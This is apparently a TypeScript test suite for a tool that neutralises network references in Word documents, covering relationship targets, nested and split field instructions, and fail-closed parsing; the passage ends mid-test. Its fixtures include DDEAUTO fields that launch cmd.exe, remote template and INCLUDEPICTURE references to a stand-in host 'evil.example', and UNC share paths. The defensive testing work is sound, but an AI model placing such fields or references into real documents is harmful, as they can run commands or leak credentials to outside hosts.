import { describe, it, expect } from 'vitest';
import { AdmZip, DocxParser } from '@attentionform/astra-engine';
import {
  INERT_TARGET,
  REFERENCE_LIST_CAP,
  analyseReferences,
  buildReferenceReport,
  classifyTarget,
  describeReferenceReport,
  effectiveAllowNetworkReferences,
  inspectFieldInstruction,
  neutraliseReferences,
  parseAllowNetworkReferences,
} from '../../packages/engine/src/visual/references';
import { REL_NS, buildDocx, complexField, documentXml, listParts, rawZip, readPart, relsXml } from '../helpers/docx-refs';
import { createHash, randomBytes } from 'crypto';
import { DOMParser as DOMParserForTest } from '@xmldom/xmldom';

/** XML text as UTF-16 bytes, the way a tool that saves "Unicode" XML writes it. */
function utf16(text: string, endian: 'le' | 'be', bom: boolean): Buffer {
  const b = Buffer.from((bom ? '\ufeff' : '') + text, 'utf16le');
  if (endian === 'be') b.swap16();
  return b;
}
function fromUtf16(b: Buffer, endian: 'le' | 'be'): string {
  const copy = Buffer.from(b);
  if (endian === 'be') copy.swap16();
  return copy.toString('utf16le').replace(/^\ufeff/, '');
}
const rawPart = (docx: Buffer, name: string) => new AdmZip(docx).getEntry(name)!.getData();
const sha = (b: Buffer) => createHash('sha256').update(b).digest('hex');

describe('classifyTarget', () => {
  const local = ['', 'media/image1.png', '../x.png', 'C:\\pics\\a.png', 'C:/pics/a.png', 'C:x.png', 'a%20b.png', 'file:///C:/x.png', 'file://localhost/C:/x.png', 'file:/C:/x.png', 'file://C:/x.png', '\\\\?\\C:\\x.png', 'x.png#frag'];
  const network: Array<[string, string]> = [
    ['http://h/x', 'http'],
    ['HTTPS://H/X', 'https'],
    ['ftp://h/x', 'ftp'],
    ['\\\\host\\share\\x', 'unc'],
    ['//host/share/x', 'unc'],
    ['\\/host\\x', 'unc'],
    ['/\\host/x', 'unc'],
    ['file://host/share/x', 'file'],
    ['file:////host/x', 'file'],
    ['file:///\\\\host\\share\\x', 'file'],
    ['\\\\?\\UNC\\host\\x', 'unc'],
    ['%5C%5Chost%5Cx', 'unc'],
    ['%255C%255Chost%255Cx', 'unc'],
    ['http%3A%2F%2Fh%2Fx', 'http'],
    ['  http://h/x  ', 'http'],
  ];
  it.each(local)('keeps %j as local', (t) => {
    expect(classifyTarget(t).class).toBe('local');
  });
  it.each(network)('treats %j as network (%s)', (t, scheme) => {
    const c = classifyTarget(t);
    expect(c.class).toBe('network');
    expect(c.scheme).toBe(scheme);
  });
  it('fails closed on an unknown scheme', () => {
    for (const t of ['foo://x', 'ldap:x', 'gopher://h/', 'ws://h', 'a1:b2', 'ads.txt:stream']) {
      expect(classifyTarget(t)).toEqual({ class: 'unknown-scheme', scheme: 'other' });
    }
  });
  it('fails closed on anything it cannot parse', () => {
    for (const t of ['h\tttp://x', 'http://x\n', '\\\\.\\pipe\\x', '\\\\?\\GLOBALROOT\\x', '\u200bhttp://x', 'x'.repeat(5000), 'a\u0000b']) {
      expect(['unparseable', 'network']).toContain(classifyTarget(t).class);
      expect(classifyTarget(t).class).not.toBe('local');
    }
  });
  it('survives malformed percent-escapes', () => {
    expect(classifyTarget('%E0%A4%A').class).toBe('local');
    expect(classifyTarget('http://h/%E0%A4%A').class).toBe('network');
    expect(classifyTarget('%5C%5Chost%5Cx%E0').class).toBe('network');
  });
});

describe('inspectFieldInstruction', () => {
  it('rewrites only the file argument and keeps the type and switches', () => {
    const v = inspectFieldInstruction(' INCLUDEPICTURE "http://h/a.png" \\d \\* MERGEFORMATINET ');
    expect(v?.class).toBe('network');
    expect(v?.rewritten).toBe(` INCLUDEPICTURE "${INERT_TARGET}" \\d \\* MERGEFORMATINET `);
  });
  it('leaves a local file alone', () => {
    expect(inspectFieldInstruction(' INCLUDEPICTURE "C:\\\\pics\\\\a.png" \\d')?.class).toBe('local');
    expect(inspectFieldInstruction(' INCLUDEPICTURE "C:\\\\pics\\\\a.png" \\d')?.rewritten).toBeUndefined();
  });
  it('handles quoted and unquoted UNC paths and doubled backslashes', () => {
    expect(inspectFieldInstruction(' INCLUDETEXT "\\\\\\\\host\\\\share\\\\a.docx" bm')?.class).toBe('network');
    expect(inspectFieldInstruction(' INCLUDETEXT \\\\host\\share\\a.docx bm')?.class).toBe('network');
    expect(inspectFieldInstruction(' INCLUDETEXT \\\\\\\\host\\\\share\\\\a.docx')?.class).toBe('network');
  });
  it('LINK judges the second argument, so a cell range is not mistaken for a scheme', () => {
    expect(inspectFieldInstruction(' LINK Excel.Sheet.12 "C:\\\\a.xlsx" "Sheet1!R1C1:R5C5" \\a \\f 0')?.class).toBe('local');
    expect(inspectFieldInstruction(' LINK Excel.Sheet.12 "C:\\\\a.xlsx" "Sheet1!A1:B2"')?.class).toBe('local');
    expect(inspectFieldInstruction(' LINK Excel.Sheet.12 "\\\\\\\\host\\\\a.xlsx" "Sheet1!R1C1:R5C5"')?.class).toBe('network');
    expect(inspectFieldInstruction(' LINK Excel.Sheet.12 "http://h/a.xlsx" "Sheet1!R1C1"')?.rewritten).toContain(`"${INERT_TARGET}"`);
  });
  it('always neutralises DDE and DDEAUTO, whatever they point at', () => {
    for (const t of [' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"', ' DDE "excel" "C:\\\\a.xls" "R1C1"', 'ddeauto x']) {
      const v = inspectFieldInstruction(t);
      expect(v?.class).toBe('dde');
      expect(v?.rewritten).toBe(' QUOTE "" ');
    }
  });
  it('ignores field types that do not load content', () => {
    for (const t of [' HYPERLINK "http://h/x"', ' PAGE ', ' MERGEFIELD name', ' TOC \\o "1-3"', '', '   ', '123']) {
      expect(inspectFieldInstruction(t)).toBeNull();
    }
  });
  it('is case-insensitive, tolerates a missing space and an unterminated quote', () => {
    expect(inspectFieldInstruction('includepicture "http://h/a.png"')?.class).toBe('network');
    expect(inspectFieldInstruction('INCLUDEPICTURE"http://h/a.png"')?.class).toBe('network');
    expect(inspectFieldInstruction(' INCLUDEPICTURE "http://h/a.png')?.class).toBe('network');
  });
  it('a field with only switches has no file and is local', () => {
    expect(inspectFieldInstruction(' INCLUDEPICTURE \\d')?.class).toBe('local');
  });
  it('an oversized instruction is neutralised as unparseable', () => {
    const v = inspectFieldInstruction(` INCLUDEPICTURE "${'a'.repeat(40000)}"`);
    expect(v?.class).toBe('unparseable');
    expect(v?.rewritten).toBe(' QUOTE "" ');
  });
});

describe('relationships', () => {
  const rels = [
    { id: 'rId1', type: 'image', target: 'http://evil.example/p.png?token=SECRET', mode: 'External' },
    { id: 'rId2', type: 'attachedTemplate', target: 'file:///\\\\evil.example\\share\\t.dotm', mode: 'External' },
    { id: 'rId3', type: 'hyperlink', target: 'http://evil.example/click', mode: 'External' },
    { id: 'rId4', type: 'image', target: 'C:\\pics\\local.png', mode: 'External' },
    { id: 'rId5', type: 'image', target: 'media/image1.png' },
    { id: 'rId6', type: 'oleObject', target: 'embeddings/oleObject1.bin' },
    { id: 'rId7', type: 'subDocument', target: 'ftp://user:PASS@evil.example/sub.docx', mode: 'External' },
    { id: 'rId8', type: 'image', target: 'http://evil.example/internal-mode.png' },
  ];
  const docx = buildDocx({ rels });

  it('retargets network references in place, keeps ids, and leaves hyperlinks, local and embedded parts', () => {
    const a = neutraliseReferences(docx);
    expect(a.changed).toBe(true);
    const out = readPart(a.docx, 'word/_rels/document.xml.rels');
    // only the hyperlink (followed on click, not on open) still names the host
    expect(out.match(/evil\.example/g)?.length).toBe(1);
    expect(out).not.toContain('SECRET');
    expect(out).not.toContain('PASS');
    for (const id of ['rId1', 'rId2', 'rId3', 'rId4', 'rId5', 'rId6', 'rId7', 'rId8']) expect(out).toContain(`Id="${id}"`);
    expect(out.match(new RegExp(`Target="${INERT_TARGET}"`, 'g'))?.length).toBe(4); // rId1, rId2, rId7, rId8
    expect(out).toContain('Target="C:\\pics\\local.png"');
    expect(out).toContain('Target="media/image1.png"');
    expect(out).toContain('Target="embeddings/oleObject1.bin"');
    // the hyperlink is untouched (it is only followed on click)
    expect(out).toMatch(/Id="rId3"[^>]*Target="http:\/\/evil\.example\/click"/);
    // an internal-mode relationship whose target is a URL becomes an external, inert one
    expect(out).toMatch(/Id="rId8"[^>]*TargetMode="External"/);
    expect(a.found.map((f) => f.id).sort()).toEqual(['rId1', 'rId2', 'rId7', 'rId8']);
    expect(a.local.map((f) => f.id)).toEqual(['rId4']);
    expect(a.notInspected.map((f) => f.id)).toEqual(['rId6']);
  });

  it('never leaks the target in the entries or the report', () => {
    const a = neutraliseReferences(docx);
    const report = buildReferenceReport(false, a);
    const text = JSON.stringify([a.found, a.local, a.notInspected, report]);
    for (const secret of ['evil.example', 'SECRET', 'PASS', 'user', 'token', 'share', 'pics', 'local.png', 'click']) {
      expect(text).not.toContain(secret);
    }
    expect(report.omissions).toBe(true);
    expect(report.omittedCount).toBe(4);
    expect(report.localCount).toBe(1);
    expect(report.notInspectedCount).toBe(1);
    expect(a.found.find((f) => f.id === 'rId1')).toEqual({ part: 'word/_rels/document.xml.rels', id: 'rId1', kind: 'relationship', type: 'image', class: 'network', scheme: 'http' });
  });

  it('the result still opens as a document', async () => {
    const a = neutraliseReferences(
      buildDocx({
        rels: [
          { id: 'rId1', type: 'image', target: 'http://evil.example/p.png', mode: 'External' },
          { id: 'rId5', type: 'image', target: 'media/image1.png' },
        ],
        extra: { 'word/media/image1.png': Buffer.from([1, 2, 3]) },
      })
    );
    const p = new DocxParser(a.docx);
    await expect(p.getAST()).resolves.toBeTruthy();
  });

  it('returns the input object untouched when nothing needs changing', () => {
    const clean = buildDocx({ rels: [{ id: 'rId5', type: 'image', target: 'media/image1.png' }, { id: 'rId3', type: 'hyperlink', target: 'https://example.com/', mode: 'External' }] });
    const a = neutraliseReferences(clean);
    expect(a.docx).toBe(clean);
    expect(a.changed).toBe(false);
    expect(a.found).toEqual([]);
    expect(buildReferenceReport(false, a).omissions).toBe(false);
    expect(describeReferenceReport(buildReferenceReport(false, a))).toBeNull();
  });

  it('a package without a document rels part is fine', () => {
    const a = neutraliseReferences(buildDocx());
    expect(a.changed).toBe(false);
  });

  it('handles attribute order, single quotes, entities and a prefixed relationships namespace', () => {
    const xml = `<?xml version="1.0"?><r:Relationships xmlns:r="${REL_NS}"><r:Relationship TargetMode='External' Target='http://evil.example/a?x=1&amp;y=2' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/image' Id='rId9'/></r:Relationships>`;
    const a = neutraliseReferences(buildDocx({ extra: { 'word/_rels/document.xml.rels': xml } }));
    expect(a.found).toHaveLength(1);
    expect(readPart(a.docx, 'word/_rels/document.xml.rels')).not.toContain('evil.example');
  });

  it('checks rels parts anywhere in the package, not only the main one', () => {
    const a = neutraliseReferences(
      buildDocx({
        extra: {
          'word/_rels/header1.xml.rels': relsXml([{ id: 'rId1', type: 'image', target: 'http://evil.example/h.png', mode: 'External' }]),
          'word/_rels/footnotes.xml.rels': relsXml([{ id: 'rId1', type: 'image', target: '\\\\evil.example\\f.png', mode: 'External' }]),
          '_rels/.rels2.rels': relsXml([{ id: 'rId1', type: 'image', target: 'ftp://evil.example/x', mode: 'External' }]),
        },
      })
    );
    expect(a.found.map((f) => f.part).sort()).toEqual(['_rels/.rels2.rels', 'word/_rels/footnotes.xml.rels', 'word/_rels/header1.xml.rels']);
  });
});

describe('fields in the document body', () => {
  it('neutralises an INCLUDEPICTURE instruction split across several runs', () => {
    const body = `<w:p>${complexField([' INCLUDEPIC', 'TURE "http://', 'evil.example/a.png" \\d'])}</w:p>`;
    const a = neutraliseReferences(buildDocx({ body }));
    const xml = readPart(a.docx, 'word/document.xml');
    expect(xml).not.toContain('evil.example');
    expect(xml).toContain(INERT_TARGET);
    expect(xml).toContain('INCLUDEPICTURE');
    expect(a.found).toEqual([{ part: 'word/document.xml', id: 'field#1', kind: 'field', type: 'INCLUDEPICTURE', class: 'network', scheme: 'http' }]);
  });
  it('splits at every character without ever leaking', () => {
    const full = ' INCLUDETEXT "\\\\\\\\evil.example\\\\s\\\\a.docx" bm';
    for (let cut = 1; cut < full.length; cut += 3) {
      const body = `<w:p>${complexField([full.slice(0, cut), full.slice(cut)])}</w:p>`;
      const a = neutraliseReferences(buildDocx({ body }));
      expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
    }
  });
  it('decodes XML entities in the instruction (&quot; and &amp;)', () => {
    const body = `<w:p>${complexField([' INCLUDEPICTURE &quot;http://evil.example/a.png?x=1&amp;y=2&quot; \\d'])}</w:p>`;
    const a = neutraliseReferences(buildDocx({ body }));
    expect(a.found).toHaveLength(1);
    expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
  });
  it('handles nested fields: the inner one is judged on its own', () => {
    const inner = complexField([' INCLUDEPICTURE "http://evil.example/in.png"']);
    const body = `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> IF 1 = 1 "</w:instrText></w:r>${inner}<w:r><w:instrText>" ""</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>r</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
    const a = neutraliseReferences(buildDocx({ body }));
    expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
    expect(a.found.map((f) => f.type)).toEqual(['INCLUDEPICTURE']);
  });
  describe('a nested field supplies the arguments', () => {
    const quote = (url: string) => complexField([` QUOTE "${url}"`], url);
    const nestedBody = (type: string, inner: string, tail = '') =>
      `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> ${type} </w:instrText></w:r>${inner}${tail}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>r</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
    it.each(['INCLUDETEXT', 'INCLUDEPICTURE', 'LINK', 'IMPORT', 'includetext'])('%s with a nested QUOTE that holds a network address is neutralised', (type) => {
      const a = neutraliseReferences(buildDocx({ body: nestedBody(type, quote('http://evil.example/n')) }));
      const xml = readPart(a.docx, 'word/document.xml');
      // the address sits in the nested field's own text; the outer field no longer reads it as its argument
      expect(a.found.some((f) => f.type === type.toUpperCase() && f.kind === 'field')).toBe(true);
      expect(xml).toContain('QUOTE ""');
      expect(xml).not.toMatch(new RegExp(`>\\s*${type}\\s*<`));
    });
    it('the outer instruction text after the nested field is dropped as well', () => {
      const tail = '<w:r><w:instrText xml:space="preserve"> \\c HTML</w:instrText></w:r>';
      const a = neutraliseReferences(buildDocx({ body: nestedBody('INCLUDETEXT', quote('\\\\host\\share\\f'), tail) }));
      const xml = readPart(a.docx, 'word/document.xml');
      expect(xml).not.toContain('INCLUDETEXT');
      expect(xml).not.toContain('HTML');
    });
    it('a field of another type with a nested field is left alone', () => {
      const a = neutraliseReferences(buildDocx({ body: nestedBody('IF 1 = 1 "', quote('plain text'), '<w:r><w:instrText xml:space="preserve">" ""</w:instrText></w:r>') }));
      expect(a.found).toEqual([]);
      expect(a.changed).toBe(false);
    });
    it('a formula that starts with = and holds a nested field is left alone', () => {
      const body = `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> = </w:instrText></w:r>${complexField([' SUM(ABOVE)'], '3')}<w:r><w:instrText xml:space="preserve"> * 2</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>6</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
      const a = neutraliseReferences(buildDocx({ body }));
      expect(a.changed).toBe(false);
    });
    it('the field type built by a nested field cannot be judged: the document is refused (E_SECURITY)', () => {
      const cases = [
        // the nested field is the whole instruction
        `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>${quote('INCLUDETEXT http://evil.example/n')}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`,
        // the nested field comes first and the outer text follows
        `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>${quote('INCLUDETEXT http://evil.example/n')}<w:r><w:instrText xml:space="preserve"> \\* MERGEFORMAT</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`,
        // the type word is finished by the nested field
        `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDE</w:instrText></w:r>${quote('TEXT http://evil.example/n')}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`,
      ];
      for (const body of cases) {
        expect(() => neutraliseReferences(buildDocx({ body }))).toThrow(/E_SECURITY/);
        expect(() => analyseReferences(buildDocx({ body }), { mutate: false })).toThrow(/E_SECURITY/);
      }
    });
    describe('a simple field (w:fldSimple) inside a complex field instruction', () => {
      const simple = (url: string) => `<w:fldSimple w:instr=" QUOTE &quot;${url}&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple>`;
      const outer = (type: string, inner: string, tail = '') =>
        `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> ${type} </w:instrText></w:r>${inner}${tail}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>r</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
      it.each(['INCLUDETEXT', 'INCLUDEPICTURE', 'LINK', 'IMPORT'])('%s: the outer instruction is neutralised, in scan-only mode it is reported', (type) => {
        const docx = buildDocx({ body: outer(type, simple('http://evil.example/s')) });
        const scan = analyseReferences(docx, { mutate: false });
        expect(scan.changed).toBe(false);
        expect(scan.found.map((f) => f.type)).toEqual([type]);
        expect(scan.local).toEqual([]);
        const a = neutraliseReferences(docx);
        const xml = readPart(a.docx, 'word/document.xml');
        expect(a.changed).toBe(true);
        expect(xml).toContain('QUOTE ""');
        expect(xml).not.toMatch(new RegExp(`>\\s*${type}\\s*<`));
      });
      it('outer text after the simple field is dropped as well', () => {
        const tail = '<w:r><w:instrText xml:space="preserve"> \\c HTML</w:instrText></w:r>';
        const a = neutraliseReferences(buildDocx({ body: outer('INCLUDETEXT', simple('\\\\host\\share\\f'), tail) }));
        expect(readPart(a.docx, 'word/document.xml')).not.toContain('HTML');
      });
      it('the simple field comes first or finishes the type word: refused (E_SECURITY), also in scan-only mode', () => {
        const run = (t: string) => `<w:r><w:instrText xml:space="preserve">${t}</w:instrText></w:r>`;
        const begin = '<w:r><w:fldChar w:fldCharType="begin"/></w:r>';
        const end = '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>';
        const cases = [
          `<w:p>${begin}${simple('INCLUDETEXT http://evil.example/n')}${run(' \\* MERGEFORMAT')}${end}</w:p>`,
          `<w:p>${begin}${run(' INCLUDE')}${simple('TEXT http://evil.example/n')}${end}</w:p>`,
          `<w:p>${begin}${simple('INCLUDETEXT http://evil.example/n')}${end}</w:p>`,
        ];
        for (const body of cases) {
          expect(() => neutraliseReferences(buildDocx({ body }))).toThrow(/E_SECURITY/);
          expect(() => analyseReferences(buildDocx({ body }), { mutate: false })).toThrow(/E_SECURITY/);
        }
      });
      it('a simple field in the result part, or in a field of another type, changes nothing', () => {
        const result = `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDETEXT "local.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${simple('shown')}<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
        expect(neutraliseReferences(buildDocx({ body: result })).changed).toBe(false);
        expect(neutraliseReferences(buildDocx({ body: outer('IF 1 = 1 "', simple('plain'), '<w:r><w:instrText xml:space="preserve">" ""</w:instrText></w:r>') })).changed).toBe(false);
      });
      it('a simple field with a network INCLUDEPICTURE inside is still judged on its own', () => {
        const inner = `<w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://evil.example/in.png&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple>`;
        const a = neutraliseReferences(buildDocx({ body: outer('INCLUDETEXT', inner) }));
        expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
        expect(a.found.map((f) => f.type).sort()).toEqual(['INCLUDEPICTURE', 'INCLUDETEXT']);
      });
    });
    it('a nested field in the result part of a field is not an argument', () => {
      const body = `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDETEXT "local.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${quote('shown')}<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
      const a = neutraliseReferences(buildDocx({ body }));
      expect(a.changed).toBe(false);
      expect(a.local).toHaveLength(1);
    });
    it('the nested field is still judged on its own', () => {
      const inner = complexField([' INCLUDEPICTURE "http://evil.example/in.png"']);
      const a = neutraliseReferences(buildDocx({ body: nestedBody('INCLUDETEXT', inner) }));
      expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
      expect(a.found.map((f) => f.type).sort()).toEqual(['INCLUDEPICTURE', 'INCLUDETEXT']);
    });
    it('a DDE field with a nested field is neutralised as dde', () => {
      const a = neutraliseReferences(buildDocx({ body: nestedBody('DDEAUTO', quote('cmd')) }));
      expect(a.found.map((f) => f.class)).toContain('dde');
    });
  });
  it('neutralises w:fldSimple', () => {
    const body = '<w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://evil.example/s.png&quot; \\d"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>';
    const a = neutraliseReferences(buildDocx({ body }));
    const xml = readPart(a.docx, 'word/document.xml');
    expect(xml).not.toContain('evil.example');
    expect(xml).toContain(INERT_TARGET);
    expect(a.found).toHaveLength(1);
  });
  it('neutralises deleted instructions and an unterminated field', () => {
    const body = '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:delInstrText> INCLUDEPICTURE "http://evil.example/d.png"</w:delInstrText></w:r></w:p>';
    const a = neutraliseReferences(buildDocx({ body }));
    expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
  });
  it('neutralises an orphan instruction outside any field', () => {
    const body = '<w:p><w:r><w:instrText> INCLUDEPICTURE "http://evil.example/o.png"</w:instrText></w:r></w:p>';
    const a = neutraliseReferences(buildDocx({ body }));
    expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
  });
  it('neutralises DDEAUTO', () => {
    const body = `<w:p>${complexField([' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"'])}</w:p>`;
    const a = neutraliseReferences(buildDocx({ body }));
    const xml = readPart(a.docx, 'word/document.xml');
    expect(xml).not.toContain('cmd.exe');
    expect(a.found[0]).toMatchObject({ type: 'DDEAUTO', class: 'dde' });
  });
  it('keeps a local field and reports it as local', () => {
    const body = `<w:p>${complexField([' INCLUDEPICTURE "C:\\\\pics\\\\a.png" \\d'])}</w:p>`;
    const clean = buildDocx({ body });
    const a = neutraliseReferences(clean);
    expect(a.docx).toBe(clean);
    expect(a.local).toHaveLength(1);
  });
  it('works with an unprefixed default namespace, another prefix and the strict namespace', () => {
    const field = (p: string) => `<${p}p><${p}r><${p}fldChar ${p === '' ? '' : p.replace(':', '')}fldCharType="begin"/></${p}r></${p}p>`;
    void field;
    const mk = (p: string, ns: string, defaultNs = false) => {
      const q = defaultNs ? '' : `${p}:`;
      const attr = defaultNs ? 'w:fldCharType' : `${p}:fldCharType`;
      const body = `<${q}p><${q}r><${q}fldChar ${attr}="begin" xmlns:w="${ns}"/></${q}r><${q}r><${q}instrText> INCLUDEPICTURE "http://evil.example/n.png"</${q}instrText></${q}r><${q}r><${q}fldChar ${attr}="end" xmlns:w="${ns}"/></${q}r></${q}p>`;
      return documentXml(body, { ns, prefix: p, defaultNs });
    };
    const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
    for (const document of [mk('w', W), mk('x', W), mk('w', W, true), mk('w', 'http://purl.oclc.org/ooxml/wordprocessingml/main')]) {
      const a = neutraliseReferences(buildDocx({ document }));
      expect(readPart(a.docx, 'word/document.xml')).not.toContain('evil.example');
      expect(a.found).toHaveLength(1);
    }
  });
  it('scans headers, footers, footnotes, comments and glossary parts', () => {
    const part = documentXml(`<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}</w:p>`);
    const names = ['word/header1.xml', 'word/footer2.xml', 'word/footnotes.xml', 'word/endnotes.xml', 'word/comments.xml', 'word/glossary/document.xml', 'word/odd-name.xml'];
    const a = neutraliseReferences(buildDocx({ extra: Object.fromEntries(names.map((n) => [n, part])) }));
    for (const n of names) expect(readPart(a.docx, n)).not.toContain('evil.example');
    expect(a.found).toHaveLength(names.length);
  });
  it('finds a field in a part hidden under a name or folder a skip list would trust', () => {
    const part = documentXml(`<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}</w:p>`);
    const names = ['word/theme/evil.xml', 'docProps/core.xml', 'customXml/item1.xml', 'word/document.bin', 'word/media/doc.dat', 'ppt/whatever', 'x'];
    for (const n of names) {
      const a = neutraliseReferences(buildDocx({ extra: { [n]: part } }));
      expect(readPart(a.docx, n), n).not.toContain('evil.example');
      expect(a.found, n).toHaveLength(1);
    }
  });
  it('binary parts are left alone, even ones that start like UTF-16 text', () => {
    const emf = Buffer.from([0x01, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00]);
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x00, 0x00, 0x0d]);
    const docx = buildDocx({ extra: { 'word/media/image1.emf': emf, 'word/media/image2.png': png, 'word/embeddings/o.bin': Buffer.from([0xff, 0xfe, 0x00, 0x00]) } });
    const a = neutraliseReferences(docx);
    expect(a.docx).toBe(docx);
  });
  it('does not inflate a large media-looking part', () => {
    const big = randomBytes(17 * 1024 * 1024); // incompressible, so it passes the zip ceiling
    big[0] = 0x3c; // would parse as garbage XML if it were read
    const docx = buildDocx({ extra: { 'word/media/big.png': big } });
    expect(() => neutraliseReferences(docx)).not.toThrow();
  });
  it('skips nothing by name and leaves unrelated parts byte-identical', () => {
    const styles = '<styles>' + 'INCLUDEPICTURE instrText'.repeat(3) + '</styles>';
    const docx = buildDocx({ body: `<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}</w:p>`, extra: { 'word/styles.xml': styles, 'word/media/image1.png': Buffer.from([1, 2, 3]) } });
    const a = neutraliseReferences(docx);
    expect(readPart(a.docx, 'word/styles.xml')).toBe(styles);
    expect(listParts(a.docx).sort()).toEqual(listParts(docx).sort());
  });
});

describe('scan-only mode and the original bytes', () => {
  const docx = buildDocx({
    body: `<w:p>${complexField([' INCLUDEPICTURE "http://evil.example/x.png"'])}</w:p>`,
    rels: [{ id: 'rId1', type: 'image', target: 'http://evil.example/p.png', mode: 'External' }],
  });
  it('lists what it recognised without changing a byte', () => {
    const before = sha(docx);
    const a = analyseReferences(docx, { mutate: false });
    expect(a.docx).toBe(docx);
    expect(a.changed).toBe(false);
    expect(a.found).toHaveLength(2);
    expect(sha(docx)).toBe(before);
    const report = buildReferenceReport(true, a);
    expect(report.networkReferencesAllowed).toBe(true);
    expect(report.omissions).toBe(false);
    expect(report.recognisedCount).toBe(2);
    expect(describeReferenceReport(report)).toMatch(/may contact 2 locations/);
    expect(describeReferenceReport(report)).toMatch(/not exhaustive/);
  });
  it('neutralising never modifies the input buffer', () => {
    const before = sha(docx);
    const a = neutraliseReferences(docx);
    expect(a.docx).not.toBe(docx);
    expect(sha(docx)).toBe(before);
    expect(describeReferenceReport(buildReferenceReport(false, a))).toMatch(/2 network references were not loaded/);
  });
  it('caps the lists but keeps exact counts', () => {
    const rels = Array.from({ length: 120 }, (_, i) => ({ id: `rId${i + 1}`, type: 'image', target: `http://evil.example/${i}.png`, mode: 'External' }));
    const a = neutraliseReferences(buildDocx({ rels }));
    const report = buildReferenceReport(false, a);
    expect(report.omittedCount).toBe(120);
    expect(report.omittedReferences).toHaveLength(REFERENCE_LIST_CAP);
  });
});

describe('fail closed', () => {
  it('a file that is not a zip', () => {
    expect(() => neutraliseReferences(Buffer.from('not a zip at all'))).toThrowError(/E_SECURITY/);
    try {
      neutraliseReferences(Buffer.from('nope'));
    } catch (e) {
      expect((e as { code: string }).code).toBe('E_SECURITY');
      expect((e as { remedy: string }).remedy).toMatch(/allow-network-references/);
    }
  });
  it('malformed XML in a rels part or a document part', () => {
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/_rels/document.xml.rels': '<Relationships><Relationship' } }))).toThrow(/not well-formed/);
    expect(() => neutraliseReferences(buildDocx({ document: '<w:document xmlns:w="x"><w:body><w:instrText>' }))).toThrow(/E_SECURITY/);
  });
  it.each([
    ['an unquoted attribute value (a parser warning)', '<Relationships><Relationship Target=http://evil.example/x/></Relationships>'],
    ['an attribute that is never closed', '<Relationships><Relationship Target="http://evil.example/x /></Relationships>'],
    ['a repeated attribute', '<Relationships><Relationship Target="a" Target="http://evil.example/x"/></Relationships>'],
    ['a second root element after the first', '<Relationships><Relationship Target="a"/></Relationships><Relationship Target="http://evil.example/x"/>'],
  ])('a rels part with %s is refused, not partly read', (_name, xml) => {
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/_rels/document.xml.rels': xml } }))).toThrow(/E_SECURITY.*not well-formed/);
  });
  it('a DOCTYPE or entity declaration', () => {
    const doctype = '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY e "x">]><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>';
    expect(() => neutraliseReferences(buildDocx({ extra: { 'word/_rels/document.xml.rels': doctype } }))).toThrow(/DOCTYPE/);
  });
  it('a UTF-16 part that cannot be decoded', () => {
